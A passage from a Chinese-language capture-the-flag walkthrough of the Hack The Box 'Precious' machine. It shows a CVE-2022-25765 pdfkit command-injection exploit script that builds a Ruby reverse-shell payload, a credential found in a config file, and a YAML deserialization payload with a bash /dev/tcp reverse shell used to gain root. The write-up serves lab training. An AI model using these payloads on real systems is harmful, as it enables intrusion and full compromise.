class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> sys.<span class="hljs-symbol">argv:</span><br>        <span class="hljs-symbol">try:</span><br>            <span class="hljs-keyword">if</span> sys.argv[sys.argv.index(args[<span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> <span class="hljs-symbol">args:</span><br>                <span class="hljs-keyword">raise</span><br>            command = sys.argv[sys.argv.index(args[<span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>]<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a custom command! \&quot;-c &lt;command&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        payload = f<span class="hljs-string">&quot;http://%20`&#123;command&#125;`&quot;</span><br>        mode = <span class="hljs-string">&quot;command&quot;</span><br>    elif args[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> sys.<span class="hljs-symbol">argv:</span><br>        <span class="hljs-symbol">try:</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> sys.argv[sys.argv.index(args[<span class="hljs-number">2</span>]) + <span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">raise</span><br>            listenIP = sys.argv[sys.argv.index(args[<span class="hljs-number">2</span>]) + <span class="hljs-number">1</span>]<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target and port! \&quot;-s &lt;target-IP&gt; &lt;target-port&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        <span class="hljs-symbol">try:</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> sys.argv[sys.argv.index(args[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span>]:<br>                <span class="hljs-keyword">raise</span><br>            listenPort = sys.argv[sys.argv.index(args[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span>]<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target port! \&quot;-t &lt;target-IP&gt; &lt;target-port&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        payload = f<span class="hljs-string">&quot;http://%20`ruby -rsocket -e&#x27;spawn(\&quot;sh\&quot;,[:in,:out,:err]=&gt;TCPSocket.new(\&quot;&#123;str(listenIP)&#125;\&quot;,\&quot;&#123;str(listenPort)&#125;\&quot;))&#x27;`&quot;</span><br>        mode = <span class="hljs-string">&quot;shell&quot;</span><br>    <span class="hljs-symbol">else:</span><br>        help()<br><br>    <span class="hljs-keyword">if</span> args[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">and</span> args[<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> sys.<span class="hljs-symbol">argv:</span><br>        <span class="hljs-symbol">try:</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> sys.argv[sys.argv.index(args[<span class="hljs-number">3</span>]) + <span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> len(sys.argv[sys.argv.index(args[<span class="hljs-number">3</span>]) + <span class="hljs-number">1</span>]) == <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">raise</span><br>            website = sys.argv[sys.argv.index(args[<span class="hljs-number">3</span>]) + <span class="hljs-number">1</span>]<br>            mode = <span class="hljs-string">&quot;web&quot;</span> + mode<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        <span class="hljs-symbol">try:</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> sys.argv[sys.argv.index(args[<span class="hljs-number">4</span>]) + <span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> len(sys.argv[sys.argv.index(args[<span class="hljs-number">4</span>]) + <span class="hljs-number">1</span>]) == <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">raise</span><br>            postArg = sys.argv[sys.argv.index(args[<span class="hljs-number">4</span>]) + <span class="hljs-number">1</span>]<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>            exit()<br>    elif args[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">or</span> args[<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> sys.<span class="hljs-symbol">argv:</span><br>        print(<br>            f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\&quot;&#123;color.no&#125;&quot;</span>)<br>        exit()<br><br>    exploit(payload, mode, postArg)  <br></code></pre></td></tr></table></figure>

<p>看不懂ruby也无所谓，能看懂帮助信息就行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Usage:<br>  python3 exploit-CVE-2022–25765.py -c &lt;<span class="hljs-built_in">command</span>&gt;<br>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;<br>  python3 exploit-CVE-2022–25765.py -c &lt;<span class="hljs-built_in">command</span>&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]<br>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]<br>  python3 exploit-CVE-2022–25765.py -h<br><br>Options:<br>  -c    Custom <span class="hljs-built_in">command</span> mode. Provide <span class="hljs-built_in">command</span> to generate custom payload with.<br>  -s    Reverse shell mode. Provide <span class="hljs-built_in">local</span> IP and port to generate reverse shell payload with.<br>  -w    URL of website running vulnerable pdfkit. (Optional)<br>  -p    POST parameter on website running vulnerable pdfkit. (Optional)<br>  -h    Show this <span class="hljs-built_in">help</span> menu.<br></code></pre></td></tr></table></figure>

<p>我们可以直接用<code>python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]</code>这条指令直接拿到反弹shell。当然，必要的参数不能少： <code>-w htp://precious.htb -p url</code>。<code>-p</code>这个POST参数是哪来的呢，打开控制台查看Network里面可以查看Request就可以找到。实际上就是网页用form表单形式提交数据。因为是命令注入，所以我们的payload填到里面就可以执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ python3 51293.py -s 10.10.10.128 443 -w http://precious.htb -p url<br><br>        _ __,~~~/_        __  ___  _______________  ___  ___<br>    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \<br>        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /<br>_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....<br>    <br>UNICORD: Exploit <span class="hljs-keyword">for</span> CVE-2022–25765 (pdfkit) - Command Injection<br>OPTIONS: Reverse Shell Sent to Target Website Mode<br>PAYLOAD: http://%20`ruby -rsocket -e<span class="hljs-string">&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;10.10.10.128&quot;,&quot;443&quot;))&#x27;</span>`                                                                                         <br>LOCALIP: 10.10.10.128:443<br>WARNING: Be sure to start a <span class="hljs-built_in">local</span> listener on the above IP and port. <span class="hljs-string">&quot;nc -lnvp 443&quot;</span>.<br>WEBSITE: http://precious.htb<br>POSTARG: url<br>EXPLOIT: Payload sent to website!<br>SUCCESS: Exploit performed action.<br></code></pre></td></tr></table></figure>

<p>另一边终端开启nc监听443就可以连接上了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nc -lvp 443                    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br> connect to [10.10.10.128] from precious.htb [10.10.10.133] 54028<br><span class="hljs-built_in">whoami</span><br>ruby<br></code></pre></td></tr></table></figure>

<h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>如果想尝试用手动方式验证，可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://20%`sleep 5`<br></code></pre></td></tr></table></figure>

<p>如果停了5s就说明PoC有效。为啥不能用whoami或者ls？因为没回显。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="提权到其他用户"><a href="#提权到其他用户" class="headerlink" title="提权到其他用户"></a>提权到其他用户</h3><p>拿到shell的第一件事当然是先用python搞一个交互性更好的shell。没有python记得看看有没有python3。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>ruby@precious:/var/www/pdfapp$<br></code></pre></td></tr></table></figure>

<p>那么接着的第一件事就是<code>sudo -l</code>,要密码，过。</p>
<p>那就先手动遍历下文件吧。首先要看的就是home目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby@precious:/var/www/pdfapp$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>ruby@precious:/home$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x  5 root        root        4096 Jun 12 04:23 .<br>drwxr-xr-x 19 root        root        4096 May 16 10:31 ..<br>drwxr-xr-x 15 gaoxiaodiao gaoxiaodiao 4096 Jun 12 05:40 gaoxiaodiao<br>drwxr-xr-x  5 henry       henry       4096 Jun 12 05:10 henry<br>drwxr-xr-x  4 ruby        ruby        4096 Jun 12 04:23 ruby<br></code></pre></td></tr></table></figure>

<p>我们发现有三个用户。</p>
<p>一个个看吧。gaoxiaodiao里面啥也没有。henry里面能看的没啥用，想看user flag的没权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">uby@precious:/home/henry$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 5 henry henry 4096 Jun 12 05:10 .<br>drwxr-xr-x 5 root  root  4096 Jun 12 04:23 ..<br>lrwxrwxrwx 1 henry henry    9 Jun 12 04:23 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 henry henry  220 Jun 12 04:23 .bash_logout<br>-rw-r--r-- 1 henry henry 3974 Jun 12 05:07 .bashrc<br>drwx------ 2 henry henry 4096 Jun 12 05:08 .cache<br>drwx------ 3 henry henry 4096 Jun 12 04:56 .config<br>drwxr-xr-x 3 henry henry 4096 Jun 12 04:23 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 henry henry  807 Jun 12 04:23 .profile<br>-rw-r----- 1 henry henry  536 Jun 12 05:01 user.txt<br>lrwxrwxrwx 1 henry henry    9 Jun 12 05:10 .viminfo -&gt; /dev/null<br></code></pre></td></tr></table></figure>

<p>乖乖看ruby自己的home目录吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby@precious:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 4 ruby ruby 4096 Jun 12 04:23 .<br>drwxr-xr-x 5 root root 4096 Jun 12 04:23 ..<br>lrwxrwxrwx 1 ruby ruby    9 Jun 12 04:23 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 ruby ruby  220 Jun 12 04:23 .bash_logout<br>-rw-r--r-- 1 ruby ruby 3771 Jun 12 04:23 .bashrc<br>dr-xr-xr-x 2 ruby ruby 4096 Jun 12 04:23 .bundle<br>drwxr-xr-x 3 ruby ruby 4096 Jun 12 04:23 .cache<br>-rw-r--r-- 1 ruby ruby  807 Jun 12 04:23 .profile<br>ruby@precious:~$ <span class="hljs-built_in">cd</span> .bund<br><span class="hljs-built_in">cd</span> .bundle/<br>ruby@precious:~/.bundle$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>dr-xr-xr-x 2 ruby ruby 4096 Jun 12 04:23 .<br>drwxr-xr-x 4 ruby ruby 4096 Jun 12 04:23 ..<br>-r-xr-xr-x 1 ruby ruby   62 Jun 12 04:23 config<br>ruby@precious:~/.bundle$ <span class="hljs-built_in">cat</span> cconfig<br><span class="hljs-built_in">cat</span> config <br>---<br>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="hljs-string">&quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br>ruby@precious:~/.bundle$ su henry<br>su henry<br>Password: Q3c1AqGHtoI0aXAYFH<br><br>henry@precious:/home/ruby/.bundle$<br></code></pre></td></tr></table></figure>

<p>我们在ruby的home目录下的<code>/.bundle</code>里的config文件里找到的henry的用户凭证，而且竟然是真的。我们可以成功切换到henry用户。</p>
<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>刚才的shell交互性很拉，且机子是开了ssh的，那我们直接ssh连进来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ ssh henry@10.10.10.133            <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.133 (10.10.10.133)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hhZ2PP71pBNZ2j6slM0FYVNYiySWo+MZtY1HNrglpHs.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.133<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">henry@10.10.10.133&#x27;</span>s password: <br><br>Last login: Mon Jun 12 05:13:05 2023 from 192.168.42.1<br>henry@precious:~$ <span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 5 henry henry 4096 Jun 12 05:10 .<br>drwxr-xr-x 5 root  root  4096 Jun 12 04:23 ..<br>lrwxrwxrwx 1 henry henry    9 Jun 12 04:23 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 henry henry  220 Jun 12 04:23 .bash_logout<br>-rw-r--r-- 1 henry henry 3974 Jun 12 05:07 .bashrc<br>drwx------ 2 henry henry 4096 Jun 12 05:08 .cache<br>drwx------ 3 henry henry 4096 Jun 12 04:56 .config<br>drwxr-xr-x 3 henry henry 4096 Jun 12 04:23 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 henry henry  807 Jun 12 04:23 .profile<br>-rw-r----- 1 henry henry  536 Jun 12 05:01 user.txt<br>lrwxrwxrwx 1 henry henry    9 Jun 12 05:10 .viminfo -&gt; /dev/null<br>henry@precious:~$ <span class="hljs-built_in">cat</span> user.txt <br><br>bf***************************1b<br></code></pre></td></tr></table></figure>

<p>登进来拿到user flag。</p>
<p>该提权到root了。那么接着第一步<code>sudo -l</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">henry@precious:/home$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> henry on precious:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User henry may run the following commands on precious:<br>    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb<br></code></pre></td></tr></table></figure>

<p>发现可以无密码<code>sudo ruby /opt/update_dependencies.rb</code>。</p>
<p>那我们看看能不能对这里下手。</p>
<p>先看看这个ruby文件里写了啥。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">henry<span class="hljs-variable">@precious</span><span class="hljs-symbol">:/opt</span><span class="hljs-variable">$ </span>cat update_dependencies.rb <br><span class="hljs-comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;yaml&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;rubygems&#x27;</span><br><br><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> update versions automatically</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_gems</span>()<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_from_file</span><br>    <span class="hljs-variable constant_">YAML</span>.load(<span class="hljs-title class_">File</span>.read(<span class="hljs-string">&quot;dependencies.yml&quot;</span>))<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_local_gems</span><br>    <span class="hljs-title class_">Gem</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Specification</span>.sort_by&#123; |<span class="hljs-params">g</span>| [g.name.downcase, g.version] &#125;.map&#123;|<span class="hljs-params">g</span>| [g.name, g.version.to_s]&#125;<br><span class="hljs-keyword">end</span><br><br>gems_file = list_from_file<br>gems_local = list_local_gems<br><br>gems_file.each <span class="hljs-keyword">do</span> |<span class="hljs-params">file_name, file_version</span>|<br>    gems_local.each <span class="hljs-keyword">do</span> |<span class="hljs-params">local_name, local_version</span>|<br>        <span class="hljs-keyword">if</span>(file_name == local_name)<br>            <span class="hljs-keyword">if</span>(file_version != local_version)<br>                puts <span class="hljs-string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name<br>            <span class="hljs-keyword">else</span><br>                puts <span class="hljs-string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name<br>            <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>和注释里写的差不多，读dependencies.yml文件并和本地安装的依赖对比版本。</p>
<p>虽然能大致看懂这段代码，但是我们该怎么利用呢。直接Google一下吧：<code>ruby priv esca</code>,查到一个<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/">网页</a>介绍了如何用ruby脚本提权。实际上是用了yaml的反序列。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#Check if the current user could run the ruby script as root privilege.</span><br><span class="hljs-comment"># (root) NOPASSWD: /usr/bin/ruby sample.rb</span><br><br><span class="hljs-comment">#If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::Installer</span><br>    <span class="hljs-attr">i:</span> <span class="hljs-string">x</span><br><span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::SpecFetcher</span><br>    <span class="hljs-attr">i:</span> <span class="hljs-string">y</span><br><span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::Requirement</span><br>  <span class="hljs-attr">requirements:</span><br>    <span class="hljs-type">!ruby/object:Gem::Package::TarReader</span><br>    <span class="hljs-attr">io:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Net::BufferedIO</span><br>      <span class="hljs-attr">io:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Gem::Package::TarReader::Entry</span><br>         <span class="hljs-attr">read:</span> <span class="hljs-number">0</span><br>         <span class="hljs-attr">header:</span> <span class="hljs-string">&quot;abc&quot;</span><br>      <span class="hljs-attr">debug_output:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Net::WriteAdapter</span><br>         <span class="hljs-attr">socket:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Gem::RequestSet</span><br>             <span class="hljs-attr">sets:</span> <span class="hljs-type">!ruby/object:Net::WriteAdapter</span><br>                 <span class="hljs-attr">socket:</span> <span class="hljs-type">!ruby/module</span> <span class="hljs-string">&#x27;Kernel&#x27;</span><br>                 <span class="hljs-attr">method_id:</span> <span class="hljs-string">:system</span><br>             <span class="hljs-attr">git_set:</span> <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;local-ip&gt;/&lt;local-port&gt; 0&gt;&amp;1&#x27;&quot;</span><br>         <span class="hljs-attr">method_id:</span> <span class="hljs-string">:resolve</span><br><br></code></pre></td></tr></table></figure>

<p>和我们目前的情况完全匹配，照葫芦画瓢就行了。在<code>/tmp</code>目录下创建<code>dependencies.yml</code>文件，把上面这段复制进去，改个ip和端口再在攻击上开个nc监听。然后直接执行脚本应该就可以了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">henry@precious:/tmp$ sudo ruby /opt/update_dependencies.rb<br>sh: 1: reading: not found<br></code></pre></td></tr></table></figure>

<p>nc监听一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nc -lvp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [10.10.10.128] from precious.htb [10.10.10.133] 41114<br>root@precious:/tmp<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@precious:~<span class="hljs-comment"># ls -la</span><br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwx------  6 root root 4096 Jun 12 05:02 .<br>drwxr-xr-x 19 root root 4096 May 16 10:31 ..<br>lrwxrwxrwx  1 root root    9 Jun 12 05:02 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3300 Jun 12 05:06 .bashrc<br>drwxr-xr-x  3 root root 4096 Jun 12 04:39 .bundle<br>drwxr-xr-x  3 root root 4096 Jun 12 04:24 .gem<br>-rw-r--r--  1 root root  161 Dec  5  2019 .profile<br>-rw-r--r--  1 root root  504 Jun 12 05:02 root.txt<br>drwx------  3 root root 4096 May 16 10:37 snap<br>drwx------  2 root root 4096 May 16 10:37 .ssh<br>lrwxrwxrwx  1 root root    9 Jun 12 05:02 .viminfo -&gt; /dev/null<br>root@precious:~<span class="hljs-comment"># cat root</span><br><span class="hljs-built_in">cat</span> root.txt <br>*****************************<br></code></pre></td></tr></table></figure>

<p>成功拿到root flag。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/05/Anonymous_Playground/">← Next [THM]  Anonymous Playground</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/07/Jack/">[THM]  Jack Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span 